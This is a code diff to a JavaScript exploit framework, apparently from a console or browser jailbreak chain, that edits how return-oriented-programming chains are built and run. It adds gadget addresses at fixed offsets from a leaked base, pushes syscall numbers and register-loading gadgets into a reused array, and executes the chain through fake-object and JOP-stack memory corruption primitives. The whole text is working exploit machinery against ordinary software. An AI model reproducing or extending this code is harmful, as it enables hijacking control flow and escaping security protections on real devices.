@@ -499,6 +499,10 @@ var utils = {
   }
 }
 
+// Use the same array for all the ROP calls
+// We preallocate a bunch of space to avoid running out of it
+var insts_wrapper = [2000];
+
 var fn = {
   register: function (input, name, ret) {
     //if (name in this) {
@@ -542,18 +546,21 @@ var fn = {
       throw new Error('More than 6 arguments is not supported !!')
     }
 
-    var insts = []
+    //var insts = []
+
+    // Clear array without allocating new memory
+    insts_wrapper.length = 0;
 
     var regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]
 
-    insts.push(gadgets.POP_RAX_RET)
-    insts.push(this.id || 0)
+    insts_wrapper.push(gadgets.POP_RAX_RET)
+    insts_wrapper.push(this.id || 0)
 
     for (var i = 0; i < arguments.length; i++) {
       var reg = regs[i]
       var value = arguments[i]
 
-      insts.push(reg)
+      insts_wrapper.push(reg)
 
       switch (typeof value) {
         case 'boolean':
@@ -572,19 +579,19 @@ var fn = {
           break
       }
 
-      insts.push(value)
+      insts_wrapper.push(value)
     }
 
-    insts.push(this.addr)
+    insts_wrapper.push(this.addr)
 
     var store_size = this.ret ? 0x10 : 8
     var store_addr = mem.malloc(store_size)
 
     if (this.ret) {
-      rop.store(insts, store_addr, 1)
+      rop.store(insts_wrapper, store_addr, 1)
     }
 
-    rop.execute(insts, store_addr, store_size)
+    rop.execute(insts_wrapper, store_addr, store_size)
 
     var result
     if (this.ret) {
@@ -645,12 +652,15 @@ var gadgets = {
     this.PUSH_RBP_POP_RCX_RET = base.add(0x1737EEE)
     this.MOV_RAX_RCX_RET = base.add(0x41015)
     this.PUSH_RAX_POP_RBP_RET = base.add(0x4E82B9)
+    this.CMP_EBX_QWORD_PTR_RDI_PLUS_RDXx4_LESS_80_RET = base.add(0x77E1BC)
+    this.CMOVE_RAX_RDI_RET = base.add(0x4E2C87)
+    this.MOV_EDI_EAX_POP_RBP_MOV_RAX_RDI_RET = base.add(43618)
   }
 }
 
 var rop = {
   idx: 0,
-  base: 0x2500,
+  base: 0x1500,
   jop_stack_store: undefined,
   jop_stack_addr: undefined,
   stack_addr: undefined,
@@ -713,10 +723,20 @@ var rop = {
     footer.push(0)
     footer.push(gadgets.LEAVE_RET)
 
-    insts = header.concat(insts).concat(footer)
+    // Avoid allocation of new array
+
+    //insts = header.concat(insts).concat(footer)
+
+    for (var ints of header) {
+      this.push(ints);
+    }
 
     for (var inst of insts) {
       this.push(inst)
+    }
+
+    for (var ints of footer) {
+      this.push(ints);
     }
 
     this.fake(0, 0, 0, mem.fakeobj(this.jop_stack_store))
